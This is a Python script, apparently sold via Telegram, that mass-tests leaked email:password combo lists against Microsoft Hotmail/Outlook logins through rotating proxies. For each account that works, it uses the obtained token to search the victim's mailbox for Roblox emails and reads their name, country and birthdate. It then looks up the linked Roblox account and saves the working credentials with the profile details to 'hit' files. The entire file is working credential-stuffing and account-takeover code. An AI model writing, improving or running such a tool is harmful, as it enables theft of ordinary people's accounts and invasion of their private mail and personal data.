import requests
import uuid
import json
import re
import threading
import sys
import time
import os
from queue import Queue
from colorama import Fore, Back, Style, init
from user_agent import generate_user_agent

init(autoreset=True)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = f"""
{Fore.YELLOW} {' '*60}
{Fore.YELLOW} {Fore.YELLOW}{' '*18}ROBLOX X HOTMAIL CHECKER{' '*18}{Fore.YELLOW} 
{Fore.YELLOW} {Fore.GREEN}{' '*24}Version 11.8{' '*25}{Fore.YELLOW} 
{Fore.YELLOW} {Fore.GREEN}{' '*24}BY : @Tesulm | t.me/marenaservice {' '*25}{Fore.YELLOW} 
{Fore.YELLOW} {Fore.MAGENTA}{' '*21}{' '*22}{Fore.YELLOW} 
{Fore.YELLOW} {' '*60} {Style.RESET_ALL}
"""
    print(banner)

def print_menu():
    print(f"\n{Fore.WHITE}[{Fore.GREEN}1{Fore.WHITE}] {Fore.YELLOW}Proxy Mode{Fore.WHITE}     - Use Proxies For Requests")
    print(f"[{Fore.GREEN}2{Fore.WHITE}] {Fore.YELLOW}Proxyless Mode{Fore.WHITE} - No Proxies (Direct Connection)")
    print(f"[{Fore.GREEN}3{Fore.WHITE}] {Fore.RED}Exit{Fore.WHITE}\n")

def get_user_choice():
    while True:
        try:
            choice = input(f"{Fore.YELLOW}➤ Select option (1-3): {Fore.WHITE}").strip()
            if choice in ['1', '2', '3']:
                return choice
            print(f"{Fore.RED}✗ Invalid choice. Please enter 1, 2, or 3.{Style.RESET_ALL}")
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}Exiting...{Style.RESET_ALL}")
            sys.exit(0)

def get_file_path(prompt_message):
    while True:
        path = input(f"{Fore.YELLOW}➤ {prompt_message}: {Fore.WHITE}").strip()
        if os.path.isfile(path):
            return path
        print(f"{Fore.RED}✗ File not found. Please check the path and try again.{Style.RESET_ALL}")

mwRetries = 99999999999
anasHitsFiles = "Roblox Hits.txt"
anasCustomFiles = "Hotmail Hits.txt"

anasHits = 0
anasBad = 0
anasCustom = 0
anasWhite = 0
anasTotalComboLines = 0
anasTotalProxyLines = 0
anasProcessedAccounts = set()
lock = threading.Lock()
anasComboQueue = Queue()
anasProxyQueue = Queue()

def anasLoadC():
    global anasTotalComboLines
    try:
        with open(anasCombo, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if line and '@' in line and ':' in line:
                    anasComboQueue.put(line)
                    anasTotalComboLines += 1
    except:
        with open(anasCombo, 'r', encoding='latin-1', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if line and '@' in line and ':' in line:
                    anasComboQueue.put(line)
                    anasTotalComboLines += 1

def anasLoadP():
    global anasTotalProxyLines
    if not anasUsePro:
        return
    
    try:
        with open(anasProxies, 'r', encoding='utf-8', errors='ignore') as f:
            proxies = [line.strip() for line in f if line.strip()]
            for proxy in proxies:
                anasProxyQueue.put(proxy)
                anasTotalProxyLines += 1
    except:
        with open(anasProxies, 'r', encoding='latin-1', errors='ignore') as f:
            proxies = [line.strip() for line in f if line.strip()]
            for proxy in proxies:
                anasProxyQueue.put(proxy)
                anasTotalProxyLines += 1

def anasGetProxy():
    if not anasUsePro or anasProxyQueue.empty():
        return None
    proxy = anasProxyQueue.get()
    anasProxyQueue.put(proxy)
    return proxy

def anasFormProxy(proxy):
    if not proxy:
        return None
    
    if '@' in proxy:
        userpass, ipport = proxy.split('@')
        user, passwd = userpass.split(':')
        ip, port = ipport.split(':')
        return {
            "http": f"http://{user}:{passwd}@{ip}:{port}",
            "https": f"http://{user}:{passwd}@{ip}:{port}"
        }
    else:
        ip, port = proxy.split(':')
        return {
            "http": f"http://{ip}:{port}",
            "https": f"http://{ip}:{port}"
        }

def anasShowStats():
    sys.stdout.write(
        f"\r -- {Fore.GREEN}Hits{Fore.WHITE}: {anasHits} | {Fore.RED}Bad{Fore.WHITE}: {anasBad} | {Fore.YELLOW}Custom{Fore.WHITE}: {anasCustom} | {Fore.YELLOW}Retries{Fore.WHITE}: {anasWhite} | {Fore.MAGENTA}Remaining{Fore.WHITE}: {anasComboQueue.qsize()}"
    )
    sys.stdout.flush()

def anasSaveHitssss(line):
    with lock:
        try:
            with open(anasHitsFiles, 'a', encoding='utf-8') as f:
                f.write(line + '\n')
        except:
            with open(anasHitsFiles, 'a', encoding='latin-1', errors='ignore') as f:
                f.write(line + '\n')

def anasSaveCustomssss(line):
    with lock:
        try:
            with open(anasCustomFiles, 'a', encoding='utf-8') as f:
                f.write(line + '\n')
        except:
            with open(anasCustomFiles, 'a', encoding='latin-1', errors='ignore') as f:
                f.write(line + '\n')

def GIDD(username):
    url = "https://users.roblox.com/v1/usernames/users"
    payload = {"usernames": [username], "excludeBannedUsers": False}
    try:
        r = requests.post(url, json=payload, timeout=10)
        if r.status_code == 200 and r.json()["data"]:
            return r.json()["data"][0]["id"]
    except:
        pass
    return None

def CSRFFF():
    url = "https://catalog.roblox.com/v1/catalog/items/details"
    s = requests.Session()
    try:
        r = s.post(url, json={"items":[]}, timeout=10)
        token = r.headers.get("x-csrf-token")
        return token, s
    except:
        return None, None

def GSNN(asset_ids):
    if not asset_ids:
        return []
    token, session = CSRFFF()
    if not token or not session:
        return []
    url = "https://catalog.roblox.com/v1/catalog/items/details"
    items = [{"itemType": "Asset", "id": int(aid)} for aid in asset_ids]
    headers = {"x-csrf-token": token}
    try:
        r = session.post(url, json={"items": items}, headers=headers, timeout=10)
        if r.status_code != 200:
            return []
        data = r.json().get("data", [])
        return [item.get("name", "Unknown Item") for item in data]
    except:
        return []

def ERUU(search_text):
    patterns = [
        r'account:\s*([a-zA-Z0-9_]+)',
        r'for\s+([a-zA-Z0-9_]+)\s+and\s+want',
        r'account:\s*([a-zA-Z0-9_]+)\.',
        r'for\s+([a-zA-Z0-9_]+)\.\s+If'
    ]
    for pattern in patterns:
        match = re.search(pattern, search_text, re.IGNORECASE)
        if match:
            return match.group(1)
    return None

def RLLL(username, proxies=None):
    result = {"username": username, "friends": 0, "banned": "No", "created": "Unknown", "profile": "", "wearing": []}
    user_id = GIDD(username)
    if not user_id:
        return None
    try:
        user_url = f"https://users.roblox.com/v1/users/{user_id}"
        user_res = requests.get(user_url, timeout=10, proxies=proxies)
        user_data = user_res.json()
        result["banned"] = "Yes" if user_data.get("isBanned", False) else "No"
        created_raw = user_data.get("created", "")
        result["created"] = created_raw.split("T")[0] if created_raw else "Unknown"
        friends_url = f"https://friends.roblox.com/v1/users/{user_id}/friends/count"
        friends_res = requests.get(friends_url, timeout=10, proxies=proxies)
        result["friends"] = friends_res.json().get("count", 0)
        result["profile"] = f"https://www.roblox.com/users/{user_id}/profile"
        wearing_url = f"https://avatar.roblox.com/v1/users/{user_id}/currently-wearing"
        wearing_res = requests.get(wearing_url, timeout=10, proxies=proxies)
        if wearing_res.status_code == 200:
            wearing_data = wearing_res.json()
            asset_ids = wearing_data.get("assetIds", [])
            asset_names = GSNN(asset_ids)
            result["wearing"] = asset_names
    except:
        return None
    return result

def extract_conversation_topics(search_text):
    topics = []
    start = 0
    while True:
        topic_start = search_text.find('"ConversationTopic":"', start)
        if topic_start == -1:
            break
        topic_start += len('"ConversationTopic":"')
        topic_end = search_text.find('"', topic_start)
        if topic_end != -1:
            topic = search_text[topic_start:topic_end]
            if topic and topic not in topics:
                topics.append(topic)
            start = topic_end + 1
        else:
            break
    return topics

def worker():
    global anasHits, anasBad, anasCustom, anasWhite
    while not anasComboQueue.empty():
        combo = anasComboQueue.get()
       
        with lock:
            if combo in anasProcessedAccounts:
                anasComboQueue.task_done()
                anasShowStats()
                continue
            anasProcessedAccounts.add(combo)
        
        if '@' not in combo or ':' not in combo:
            anasComboQueue.task_done()
            anasShowStats()
            continue
        
        email, password = combo.split(':', 1)
        retries = 0
        success = False
        
        while retries < mwRetries and not success:
            proxy = anasGetProxy() if anasUsePro else None
            proxies = anasFormProxy(proxy) if proxy else None
            session = requests.Session()
            
            try:
                user_agent = generate_user_agent()
                if proxies:
                    session.proxies = proxies
                session.timeout = 30
                
                url = (
                    "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?"
                    "client_info=1&haschrome=1&login_hint=" + str(email) +
                    "&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
                    "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
                    "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
                )
                headers = {
                    "Connection": "keep-alive",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": user_agent,
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "return-client-request-id": "false",
                    "client-request-id": str(uuid.uuid4()),
                    "x-ms-sso-ignore-sso": "1",
                    "correlation-id": str(uuid.uuid4()),
                    "x-client-ver": "1.1.0+9e54a0d1",
                    "x-client-os": "28",
                    "x-client-sku": "MSAL.xplat.android",
                    "x-client-src-sku": "MSAL.xplat.android",
                    "X-Requested-With": "com.microsoft.outlooklite",
                    "Sec-Fetch-Site": "none",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-User": "?1",
                    "Sec-Fetch-Dest": "document",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "en-US,en;q=0.9",
                }
                
                response = session.get(url, headers=headers, allow_redirects=True)
                response_text = response.text

                PPFT = ""
                urlPost = ""

                server_data_pattern = r'var ServerData = ({.*?});'
                server_data_match = re.search(server_data_pattern, response_text, re.DOTALL)

                if server_data_match:
                    try:
                        server_data_json = server_data_match.group(1)
                        server_data = json.loads(server_data_json)
                        sFTTag = server_data.get('sFTTag', '')
                        if sFTTag:
                            ppft_pattern = r'value="([^"]+)"'
                            ppft_match = re.search(ppft_pattern, sFTTag)
                            if ppft_match:
                                PPFT = ppft_match.group(1)
                        urlPost = server_data.get('urlPost', '')
                    except:
                        pass

                if not PPFT:
                    start_marker = 'name="PPFT" value="'
                    start_index = response_text.find(start_marker)
                    if start_index != -1:
                        start_index += len(start_marker)
                        end_index = response_text.find('"', start_index)
                        PPFT = response_text[start_index:end_index] if end_index != -1 else ""

                if not urlPost:
                    urlpost_pattern = r'"urlPost":"([^"]+)"'
                    urlpost_match = re.search(urlpost_pattern, response_text)
                    if urlpost_match:
                        urlPost = urlpost_match.group(1)

                cookies_dict = session.cookies.get_dict()
                MSPRequ = cookies_dict.get('MSPRequ', '')
                uaid = cookies_dict.get('uaid', '')
                MSPOK = cookies_dict.get('MSPOK', '')
                OParams = cookies_dict.get('OParams', '')
                referer_url = response.url

                if not PPFT or not urlPost:
                    with lock:
                        anasBad += 1
                    success = True
                    break

                data_string = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={PPFT}&PPSX=Passport&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=3772"
                LEN = len(data_string)

                headers_post = {
                    "User-Agent": user_agent,
                    "Pragma": "no-cache",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Host": "login.live.com",
                    "Connection": "keep-alive",
                    "Content-Length": str(LEN),
                    "Cache-Control": "max-age=0",
                    "Upgrade-Insecure-Requests": "1",
                    "Origin": "https://login.live.com",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "X-Requested-With": "com.microsoft.outlooklite",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-User": "?1",
                    "Sec-Fetch-Dest": "document",
                    "Referer": referer_url,
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Cookie": f"MSPRequ={MSPRequ}; uaid={uaid}; MSPOK={MSPOK}; OParams={OParams}"
                }

                post_response = session.post(
                    urlPost,
                    data=data_string,
                    headers=headers_post,
                    allow_redirects=False
                )

                cookies_dict = session.cookies.get_dict()
                if "__Host-MSAAUTHP" not in cookies_dict:
                    with lock:
                        anasBad += 1
                    
                    success = True
                    break

                auth_code = ""
                if post_response.status_code in [301, 302, 303, 307, 308]:
                    redirect_url = post_response.headers.get('Location', '')
                    if redirect_url and 'msauth://' in redirect_url and 'code=' in redirect_url:
                        auth_code = redirect_url.split('code=')[1].split('&')[0]
                else:
                    redirect_pattern = r'window\.location\s*=\s*["\']([^"\']+)["\']'
                    redirect_match = re.search(redirect_pattern, post_response.text)
                    if redirect_match:
                        redirect_url = redirect_match.group(1)
                        if 'msauth://' in redirect_url and 'code=' in redirect_url:
                            auth_code = redirect_url.split('code=')[1].split('&')[0]

                CID = cookies_dict.get('MSPCID', '')
                if CID:
                    CID = CID.upper()

                access_token = ""
                if auth_code:
                    url_token = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
                    data_token = {
                        "client_info": "1",
                        "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                        "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                        "grant_type": "authorization_code",
                        "code": auth_code,
                        "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
                    }
                    token_response = requests.post(
                        url_token, 
                        data=data_token, 
                        headers={"Content-Type": "application/x-www-form-urlencoded"},
                        timeout=30,
                        proxies=proxies if proxies else None
                    )
                    if token_response.status_code == 200:
                        token_data = token_response.json()
                        access_token = token_data.get("access_token", "")

                Name = ""
                Country = ""
                Birthdate = "N/A"
                
                if access_token and CID:
                    search_url = "https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124"
                    search_payload = {
                        "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
                        "Scenario": {"Name": "owa.react"},
                        "TimeZone": "United Kingdom Standard Time",
                        "TextDecorations": "Off",
                        "EntityRequests": [{
                            "EntityType": "Conversation",
                            "ContentSources": ["Exchange"],
                            "Filter": {
                                "Or": [
                                    {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                                    {"Term": {"DistinguishedFolderName": "DeletedItems"}}
                                ]
                            },
                            "From": 0,
                            "Query": {"QueryString": "no-reply@roblox.com"},
                            "RefiningQueries": None,
                            "Size": 25,
                            "Sort": [
                                {"Field": "Score", "SortDirection": "Desc", "Count": 3},
                                {"Field": "Time", "SortDirection": "Desc"}
                            ],
                            "EnableTopResults": True,
                            "TopResultsCount": 3
                        }],
                        "AnswerEntityRequests": [{
                            "Query": {"QueryString": "Playstation Sony"},
                            "EntityTypes": ["Event", "File"],
                            "From": 0,
                            "Size": 100,
                            "EnableAsyncResolution": True
                        }],
                        "QueryAlterationOptions": {
                            "EnableSuggestion": True,
                            "EnableAlteration": True,
                            "SupportedRecourseDisplayTypes": [
                                "Suggestion", "NoResultModification",
                                "NoResultFolderRefinerModification", "NoRequeryModification", "Modification"
                            ]
                        },
                        "LogicalId": "446c567a-02d9-b739-b9ca-616e0d45905c"
                    }
                    search_headers = {
                        "User-Agent": "Outlook-Android/2.0",
                        "Pragma": "no-cache",
                        "Accept": "application/json",
                        "ForceSync": "false",
                        "Authorization": f"Bearer {access_token}",
                        "X-AnchorMailbox": f"CID:{CID}",
                        "Host": "substrate.office.com",
                        "Connection": "Keep-Alive",
                        "Accept-Encoding": "gzip",
                        "Content-Type": "application/json"
                    }
                    
                    search_response = requests.post(
                        search_url, 
                        json=search_payload, 
                        headers=search_headers, 
                        timeout=30,
                        proxies=proxies if proxies else None
                    )
                    
                    if search_response.status_code == 400:
                        with lock:
                            anasWhite += 1
                        retries += 1
                        time.sleep(0.05)
                        continue
                    
                    if search_response.status_code == 200:
                        search_text = search_response.text
                        roblox_user = ERUU(search_text)
                        
                        profile_url = "https://substrate.office.com/profileb2/v2.0/me/V1Profile"
                        profile_headers = {
                            "User-Agent": "Outlook-Android/2.0",
                            "Pragma": "no-cache",
                            "Accept": "application/json",
                            "ForceSync": "false",
                            "Authorization": f"Bearer {access_token}",
                            "X-AnchorMailbox": f"CID:{CID}",
                            "Host": "substrate.office.com",
                            "Connection": "Keep-Alive",
                            "Accept-Encoding": "gzip"
                        }
                        pRes = requests.get(profile_url, headers=profile_headers, timeout=30, proxies=proxies if proxies else None)
                        if pRes.status_code == 200:
                            profile_data = pRes.json()
                            if "accounts" in profile_data and len(profile_data["accounts"]) > 0:
                                first_account = profile_data["accounts"][0]
                                Country = first_account.get("location", "")
                                BD = first_account.get("birthDay", "")
                                BM = first_account.get("birthMonth", "")
                                BY = first_account.get("birthYear", "")
                                if BD and BM and BY:
                                    BD_str = str(BD).zfill(2)
                                    BM_str = str(BM).zfill(2)
                                    Birthdate = f"{BY}-{BM_str}-{BD_str}"
                            if "names" in profile_data and len(profile_data["names"]) > 0:
                                first_name = profile_data["names"][0]
                                Name = first_name.get("displayName", "")
                        
                        total_start = search_text.find('"Total":')
                        Total = "0"
                        if total_start != -1:
                            total_start += len('"Total":')
                            total_end = search_text.find(',', total_start)
                            if total_end == -1:
                                total_end = search_text.find('}', total_start)
                            Total = search_text[total_start:total_end] if total_end != -1 else "0"
                        
                        if Total != "0" and roblox_user:
                            roblox_data = RLLL(roblox_user, proxies)
                            if roblox_data:
                                wearing_str = ", ".join(roblox_data["wearing"]) if roblox_data["wearing"] else ""
                                hit_line = f"{email}:{password} | Username = {roblox_data['username']} | Friends = {roblox_data['friends']} | Banned = {roblox_data['banned']} | Created = {roblox_data['created']} | Profile = {roblox_data['profile']} | Wearing = [{wearing_str}]"
                                with lock:
                                    anasHits += 1
                                anasSaveHitssss(hit_line)
                            else:
                                with lock:
                                    anasCustom += 1
                                anasSaveCustomssss(f"{email}:{password} | Name = {Name} | Country = {Country} | Birthdate = {Birthdate}")
                        else:
                            with lock:
                                anasCustom += 1
                            anasSaveCustomssss(f"{email}:{password} | Name = {Name} | Country = {Country} | Birthdate = {Birthdate}")
                    else:
                        with lock:
                            anasCustom += 1
                        anasSaveCustomssss(f"{email}:{password} | Name = {Name} | Country = {Country} | Birthdate = {Birthdate}")
                else:
                    with lock:
                        anasBad += 1
                    
                
                success = True
                
            except (requests.exceptions.ProxyError, 
                   requests.exceptions.ConnectTimeout, 
                   requests.exceptions.ReadTimeout,
                   requests.exceptions.ConnectionError,
                   requests.exceptions.SSLError,
                   requests.exceptions.ChunkedEncodingError):
                with lock:
                    anasWhite += 1
                retries += 1
                time.sleep(0.05)
                continue
                
            except:
                with lock:
                    anasBad += 1
                
                success = True
            
            finally:
                anasShowStats()
        
        anasComboQueue.task_done()

if __name__ == "__main__":
    clear_screen()
    print_banner()
    
    while True:
        print_menu()
        choice = get_user_choice()
        
        if choice == '3':
            print(f"{Fore.RED}Exiting... Goodbye!{Style.RESET_ALL}")
            sys.exit(0)
        
        if choice == '1':
            anasUsePro = True
            mwAnas = 40
            mode_str = f"{Fore.GREEN}Proxy Mode{Fore.WHITE}"
        else:
            anasUsePro = False
            mwAnas = 10
            mode_str = f"{Fore.YELLOW}Proxyless Mode{Fore.WHITE}"
        
        print(f"\n{Fore.WHITE}Selected: {mode_str}\n")
        
        anasCombo = get_file_path("Enter combo file path")
        
        if anasUsePro:
            anasProxies = get_file_path("Enter proxies file path")
            print(f"{Fore.YELLOW}\n⏳ Loading proxies...{Style.RESET_ALL}")
            anasLoadP()
            print(f"{Fore.GREEN}✓ Loaded {anasTotalProxyLines} proxies.{Style.RESET_ALL}")
        
        print(f"{Fore.YELLOW}⏳ Loading combos...{Style.RESET_ALL}")
        anasLoadC()
        print(f"{Fore.GREEN}✓ Loaded {anasTotalComboLines} combos.{Style.RESET_ALL}")
        
        print(f"{Fore.YELLOW}⏳ Starting threads...{Style.RESET_ALL}\n")
        time.sleep(1)
        
        thread_count = min(mwAnas, anasTotalComboLines)
        threads = []
        for _ in range(thread_count):
            t = threading.Thread(target=worker)
            t.daemon = True
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
        
        print(f"\n\n{Fore.GREEN}✓ Process completed!{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Results saved to:{Style.RESET_ALL}")
        print(f"  - Hits: {anasHitsFiles}")
        print(f"  - Custom: {anasCustomFiles}")
        
        input(f"\n{Fore.YELLOW}Press Enter to return to menu...{Style.RESET_ALL}")
        clear_screen()
        print_banner()
